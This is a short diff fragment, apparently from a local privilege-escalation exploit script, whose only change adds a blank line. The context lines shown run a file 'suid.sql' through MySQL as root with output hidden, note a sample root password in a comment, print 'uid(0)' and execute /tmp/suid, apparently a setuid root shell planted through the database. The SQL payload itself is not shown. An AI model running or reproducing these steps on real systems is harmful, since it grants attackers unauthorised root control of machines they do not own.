@@ -68,3 +68,4 @@ EOF
 mysql -u root < suid.sql >/dev/null 2>&1  #for pass : mysql -u root -p password123 < suid.sql
 echo "[+] uid(0) !!!"
 /tmp/suid
+
